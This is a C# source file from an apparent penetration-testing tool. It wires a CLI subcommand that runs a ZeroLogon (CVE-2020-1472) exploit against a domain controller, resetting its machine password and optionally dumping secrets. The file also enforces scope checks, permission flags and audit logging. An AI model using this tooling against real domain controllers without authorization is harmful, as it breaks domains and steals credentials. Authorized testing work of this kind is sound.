using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Drederick.Audit;
using Drederick.Exploit;
using Drederick.Reporting;
using Drederick.Scope;

namespace Drederick.Cli;

// --- htb-zerologon-direct ---
/// <summary>
/// <c>drederick exploit zerologon --target &lt;DC-IP&gt; --dc-name &lt;NETBIOS&gt;
/// [--reset-machine-pw] [--dump-secrets] [--json]</c>
///
/// Standalone subcommand that drives the existing
/// <see cref="ZeroLogonTool"/> exploitation flow without requiring the
/// full recon → fingerprint → adaptive-runner pipeline. Useful when the
/// operator already knows the target DC (HTB / lab boxes, post-recon
/// pivots) and just wants the bell-ringer.
///
/// <para><b>Scope &amp; safety.</b> First statement of the handler loads
/// the scope file and calls <c>scope.Require(target)</c>. The DC NetBIOS
/// name is shape-validated (<c>^[A-Z0-9\-]{1,15}$</c>) before any
/// downstream call. The destructive paths (password reset, secretsdump)
/// require <c>--reset-machine-pw</c> / <c>--dump-secrets</c>; in strict
/// mode (<c>--no-lab</c>) those additionally require
/// <c>--allow-destructive</c> AND <c>--allow-cred-attacks</c>. No flag
/// disables the scope or audit invariants.</para>
///
/// <para><b>Exit codes.</b>
/// 0 = vulnerable (probe) or successfully exploited;
/// 1 = not vulnerable;
/// 2 = scope refusal / argv validation error;
/// 3 = exploitation failed (DC reachable + vulnerable, but reset failed);
/// 4 = preconditions failed (missing impacket/msfconsole etc. —
///     <c>drederick doctor</c> will surface the gap).</para>
///
/// Closes GAP-021.
/// </summary>
public sealed class ZerologonCommand
{
    private readonly TextWriter _out;
    private readonly TextWriter _err;
    private readonly IZerologonExecutor? _executor;
    private readonly Drederick.Scope.Scope? _scopeOverride;
    private readonly AuditLog? _auditOverride;

    /// <summary>Production constructor — wires the real
    /// <see cref="ZeroLogonTool"/> executor on demand.</summary>
    public ZerologonCommand(TextWriter? stdout = null, TextWriter? stderr = null)
        : this(stdout, stderr, executor: null, scope: null, audit: null)
    { }

    /// <summary>Test constructor — inject a fake executor, scope, and
    /// audit so the unit tests never touch the network, never spawn a
    /// subprocess, and never need the full DI graph from
    /// <c>Program.cs</c>.</summary>
    internal ZerologonCommand(
        TextWriter? stdout,
        TextWriter? stderr,
        IZerologonExecutor? executor,
        Drederick.Scope.Scope? scope,
        AuditLog? audit)
    {
        _out = stdout ?? Console.Out;
        _err = stderr ?? Console.Error;
        _executor = executor;
        _scopeOverride = scope;
        _auditOverride = audit;
    }

    private static readonly Regex NetBiosShape = new(
        @"^[A-Z0-9\-]{1,15}$", RegexOptions.Compiled);

    public async Task<int> ExecuteAsync(CommandLineOptions opts, CancellationToken ct = default)
    {
        // --- arg validation -----------------------------------------------
        var target = opts.Targets.FirstOrDefault();
        if (string.IsNullOrWhiteSpace(target))
        {
            _err.WriteLine("exploit zerologon: --target <DC-IP> is required.");
            return 2;
        }

        var dcName = opts.ZerologonDcName;
        if (string.IsNullOrWhiteSpace(dcName))
        {
            _err.WriteLine("exploit zerologon: --dc-name <NETBIOS-NAME> is required.");
            return 2;
        }
        if (!NetBiosShape.IsMatch(dcName))
        {
            _err.WriteLine(
                $"exploit zerologon: --dc-name '{dcName}' is not a valid NetBIOS computer name " +
                "(expected: uppercase letters / digits / dash, max 15 chars).");
            return 2;
        }

        // --dump-secrets implies --reset-machine-pw (you need to authenticate
        // as the DC machine account with the empty password to run
        // secretsdump.py).
        var reset = opts.ZerologonResetMachinePw || opts.ZerologonDumpSecrets;
        var dumpSecrets = opts.ZerologonDumpSecrets;

        // --- destructive gating (strict mode) -----------------------------
        if (reset && !opts.LabMode)
        {
            if (!opts.AllowDestructive || !opts.AllowCredAttacks)
            {
                _err.WriteLine(
                    "exploit zerologon: --reset-machine-pw / --dump-secrets in strict mode " +
                    "(--no-lab) requires BOTH --allow-destructive AND --allow-cred-attacks. " +
                    "ZeroLogon overwrites the DC's machine account password — domain " +
                    "replication and trusts break until restored.");
                return 2;
            }
        }

        // --- scope load + require ----------------------------------------
        Drederick.Scope.Scope scope;
        try
        {
            scope = _scopeOverride ?? LoadScope(opts);
        }
        catch (ScopeException ex)
        {
            _err.WriteLine($"exploit zerologon: scope load failed: {ex.Message}");
            return 2;
        }

        try
        {
            // @invariant-id:scope-in-every-tool — first network-touching gate.
            // Target must be an IP literal at this layer; DNS resolution is
            // delegated to the executor (ZeroLogonTool already resolves and
            // re-checks scope on the resolved address).
            scope.Require(target);
        }
        catch (ScopeException ex)
        {
            _err.WriteLine($"exploit zerologon: {ex.Message}");
            return 2;
        }

        // --- audit setup --------------------------------------------------
        Directory.CreateDirectory(opts.OutputDir);
        var auditPath = Path.Combine(opts.OutputDir, "audit.jsonl");
        AuditLog audit;
        bool ownsAudit;
        if (_auditOverride is not null)
        {
            audit = _auditOverride;
            ownsAudit = false;
        }
        else
        {
            audit = new AuditLog(auditPath);
            ownsAudit = true;
        }

        var argvDigest = Sha256(
            $"zerologon|{target}|{dcName}|reset={reset}|dump={dumpSecrets}|scope={scope.Source}");
        var startedAt = DateTime.UtcNow.ToString("O");
        var invocationId = Guid.NewGuid().ToString("N");

        try
        {
            // --- executor ----------------------------------------------------
            var executor = _executor ?? new RealZerologonExecutor(scope, audit, opts);
            ZeroLogonResult result;
            try
            {
                result = await executor.RunAsync(target, dcName!, reset, dumpSecrets, ct)
                    .ConfigureAwait(false);
            }
            catch (ScopeException ex)
            {
                _err.WriteLine($"exploit zerologon: {ex.Message}");
                PersistRun(opts, invocationId, target, argvDigest, 2, startedAt, error: ex.Message);
                return 2;
            }
            catch (PermissionRefusedException ex)
            {
                _err.WriteLine($"exploit zerologon: {ex.Message}");
                PersistRun(opts, invocationId, target, argvDigest, 2, startedAt, error: ex.Message);
                return 2;
            }
            catch (Exception ex) when (LooksLikePreconditionsFailure(ex))
            {
                _err.WriteLine($"exploit zerologon: preconditions failed: {ex.Message}");
                PersistRun(opts, invocationId, target, argvDigest, 4, startedAt, error: ex.Message);
                return 4;
            }

            // --- audit + exit-code mapping -----------------------------------
            var vulnerable = result.Success || result.AttemptsNeeded > 0 && result.PasswordSetToEmpty;
            int exitCode;
            if (!reset)
            {
                // Probe mode: success means "auth bypass landed" → vulnerable.
                audit.Record("zerologon.probe", new Dictionary<string, object?>
                {
                    ["target"] = target,
                    ["dc_name"] = dcName,
                    ["vulnerable"] = result.Success,
                    ["attempts_needed"] = result.AttemptsNeeded,
                    ["argv_digest"] = argvDigest,
                });
                exitCode = result.Success ? 0 : 1;
            }
            else
            {
                // Reset mode: success means password successfully set to empty.
                audit.Record("zerologon.reset", new Dictionary<string, object?>
                {
                    ["target"] = target,
                    ["dc_name"] = dcName,
                    ["success"] = result.Success && result.PasswordSetToEmpty,
                    ["attempts_needed"] = result.AttemptsNeeded,
                    // We never recover the *original* DC machine pw from this path
                    // (impacket sets the empty pw without first reading it). The
                    // field stays null per spec — there is no plaintext to log.
                    ["dc_machine_pw_sha256"] = (string?)null,
                    ["argv_digest"] = argvDigest,
                });

                if (result.Success && result.PasswordSetToEmpty)
                {
                    exitCode = 0;
                }
                else if (result.AttemptsNeeded == 0)
                {
                    // Never got an auth bypass attempt to succeed → not vulnerable.
                    exitCode = 1;
                }
                else
                {
                    // Auth bypass landed (or partial), but the password set failed.
                    exitCode = 3;
                }

                if (dumpSecrets)
                {
                    audit.Record("zerologon.secretsdump", new Dictionary<string, object?>
                    {
                        ["target"] = target,
                        ["dc_name"] = dcName,
                        ["hash_count"] = result.SecretsCount,
                        // ntds_lines_count is best-effort: secrets_count counts
                        // user:rid:lmhash:nthash::: lines, which is the same
                        // signal. We expose both keys so downstream tooling
                        // sees the spec'd shape.
                        ["ntds_lines_count"] = result.SecretsCount,
                        // SECURITY: never log plaintext hashes — only the
                        // SHA-256 digest of the captured secretsdump output.
                        ["output_sha256"] = result.SecretsDigest,
                    });
                }
            }

            PersistRun(opts, invocationId, target, argvDigest, exitCode, startedAt,
                error: result.Error);

            // --- output ------------------------------------------------------
            EmitOutput(opts, target, dcName!, reset, dumpSecrets, result, exitCode);
            return exitCode;
        }
        finally
        {
            if (ownsAudit) audit.Dispose();
        }
    }

    private void EmitOutput(
        CommandLineOptions opts,
        string target,
        string dcName,
        bool reset,
        bool dumpSecrets,
        ZeroLogonResult result,
        int exitCode)
    {
        var payload = new
        {
            tool = "zerologon",
            mode = reset ? (dumpSecrets ? "reset+secretsdump" : "reset") : "probe",
            target,
            dc_name = dcName,
            vulnerable = result.Success || result.AttemptsNeeded > 0,
            success = result.Success,
            password_set_to_empty = result.PasswordSetToEmpty,
            attempts_needed = result.AttemptsNeeded,
            secrets_dumped = result.SecretsDumped,
            secrets_count = result.SecretsCount,
            secrets_digest = result.SecretsDigest,
            error = result.Error,
            exit_code = exitCode,
        };

        if (opts.ZerologonJson)
        {
            _out.WriteLine(JsonSerializer.Serialize(payload,
                new JsonSerializerOptions { WriteIndented = true }));
            return;
        }

        _out.WriteLine($"target          : {target}");
        _out.WriteLine($"dc_name         : {dcName}");
        _out.WriteLine($"mode            : {payload.mode}");
        _out.WriteLine($"vulnerable      : {payload.vulnerable}");
        if (reset)
        {
            _out.WriteLine($"password reset  : {result.PasswordSetToEmpty}");
        }
        if (dumpSecrets)
        {
            _out.WriteLine($"secrets dumped  : {result.SecretsDumped} (count={result.SecretsCount})");
            _out.WriteLine($"secrets sha256  : {result.SecretsDigest ?? "-"}");
        }
        _out.WriteLine($"attempts        : {result.AttemptsNeeded}");
        if (!string.IsNullOrEmpty(result.Error))
        {
            _out.WriteLine($"error           : {result.Error}");
        }
        _out.WriteLine($"exit code       : {exitCode}");

        // Also emit JSON when stdout is human + machine consumed together.
        _out.WriteLine();
        _out.WriteLine(JsonSerializer.Serialize(payload));
    }

    private static Drederick.Scope.Scope LoadScope(CommandLineOptions opts)
    {
        if (!string.IsNullOrEmpty(opts.ScopePath))
        {
            return ScopeLoader.LoadFile(opts.ScopePath, opts.AllowBroad, opts.LabMode);
        }
        var defaultPath = Path.Combine(Directory.GetCurrentDirectory(), "scope.txt");
        if (File.Exists(defaultPath))
        {
            return ScopeLoader.LoadFile(defaultPath, opts.AllowBroad, opts.LabMode);
        }
        throw new ScopeException(
            "no scope file: pass --scope <path> or place scope.txt in the working directory.");
    }

    private static void PersistRun(
        CommandLineOptions opts,
        string invocationId,
        string target,
        string argvDigest,
        int exitCode,
        string startedAt,
        string? error)
    {
        try
        {
            Directory.CreateDirectory(opts.OutputDir);
            var report = new SqliteReport(opts.OutputDir);
            report.UpsertExploitRun(new ExploitRunRecord
            {
                Tool = "zerologon",
                Target = target,
                Category = ExploitCategory.CredAttacks.ToString(),
                InvocationId = invocationId,
                Artifact = "zerologon",
                ArgvDigest = argvDigest,
                ExitCode = exitCode,
                StartedAt = startedAt,
                FinishedAt = DateTime.UtcNow.ToString("O"),
                Error = error,
            });
        }
        catch
        {
            // Persistence is best-effort — never let a SQLite hiccup mask
            // the underlying exit code. The audit log is the authoritative
            // record.
        }
    }

    private static string Sha256(string s) =>
        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(s)));

    private static bool LooksLikePreconditionsFailure(Exception ex)
    {
        // ZeroLogonTool / NetlogonRpcClient surface "command not found" /
        // "no such file" / "preflight" style errors when impacket isn't
        // installed. Map those to exit code 4 so `drederick doctor` can
        // tell the operator what to install.
        var m = ex.Message ?? "";
        return m.Contains("cve_2020_1472_exploit.py", StringComparison.OrdinalIgnoreCase)
            || m.Contains("impacket", StringComparison.OrdinalIgnoreCase)
            || m.Contains("preflight", StringComparison.OrdinalIgnoreCase)
            || m.Contains("not found", StringComparison.OrdinalIgnoreCase)
            || m.Contains("No such file", StringComparison.Ordinal);
    }
}

/// <summary>
/// Test seam: the subcommand handler delegates exploitation to an
/// implementation of this interface so unit tests can supply a fake
/// without spawning impacket subprocesses or constructing the full
/// <see cref="ZeroLogonTool"/> graph. Production uses
/// <see cref="RealZerologonExecutor"/>.
/// </summary>
public interface IZerologonExecutor
{
    Task<ZeroLogonResult> RunAsync(
        string target,
        string dcName,
        bool resetMachinePassword,
        bool dumpSecrets,
        CancellationToken ct);
}

/// <summary>
/// Production executor: wires a real <see cref="ZeroLogonTool"/> against
/// the loaded scope + audit. In probe mode (no reset) we surface a
/// preconditions-failed result by default — the bundled impacket path
/// (<c>cve_2020_1472_exploit.py</c>) is destructive in one shot, so
/// probe-only requires the SecuraBV tester variant that is not yet
/// bundled. Operators who want the bell-ringer should pass
/// <c>--reset-machine-pw</c>.
/// </summary>
internal sealed class RealZerologonExecutor : IZerologonExecutor
{
    private readonly Drederick.Scope.Scope _scope;
    private readonly AuditLog _audit;
    private readonly CommandLineOptions _opts;

    public RealZerologonExecutor(Drederick.Scope.Scope scope, AuditLog audit, CommandLineOptions opts)
    {
        _scope = scope;
        _audit = audit;
        _opts = opts;
    }

    public async Task<ZeroLogonResult> RunAsync(
        string target,
        string dcName,
        bool resetMachinePassword,
        bool dumpSecrets,
        CancellationToken ct)
    {
        if (!resetMachinePassword)
        {
            // No standalone "probe" path is implemented yet — the bundled
            // impacket exploit script is destructive in a single shot.
            // Surface this as exit code 4 (preconditions failed) so
            // operators are directed at `drederick doctor`.
            return new ZeroLogonResult
            {
                Target = target,
                DcName = dcName,
                Error = "probe-only mode requires a non-destructive ZeroLogon tester " +
                        "that is not bundled with this build. Pass --reset-machine-pw " +
                        "(destructive) to perform the full exploitation, or install a " +
                        "tester variant. Run `drederick doctor` for guidance.",
            };
        }

        // Reset / secrets-dump mode goes through the existing tool. Lab
        // mode auto-enables the required gates; strict mode honors the
        // explicit --allow-* flags the operator passed.
        var permissions = new RunPermissions(
            allowCredAttacks: _opts.LabMode || _opts.AllowCredAttacks,
            allowDestructive: _opts.LabMode || _opts.AllowDestructive);

        var exploitRunner = new ExploitRunner(_scope, _audit, _opts.OutputDir);
        var tool = new ZeroLogonTool(_scope, _audit, permissions, exploitRunner);
        return await tool.RunAsync(target, dcName, domainName: null,
            performSecretsDump: dumpSecrets, ct).ConfigureAwait(false);
    }
}
// --- end htb-zerologon-direct ---
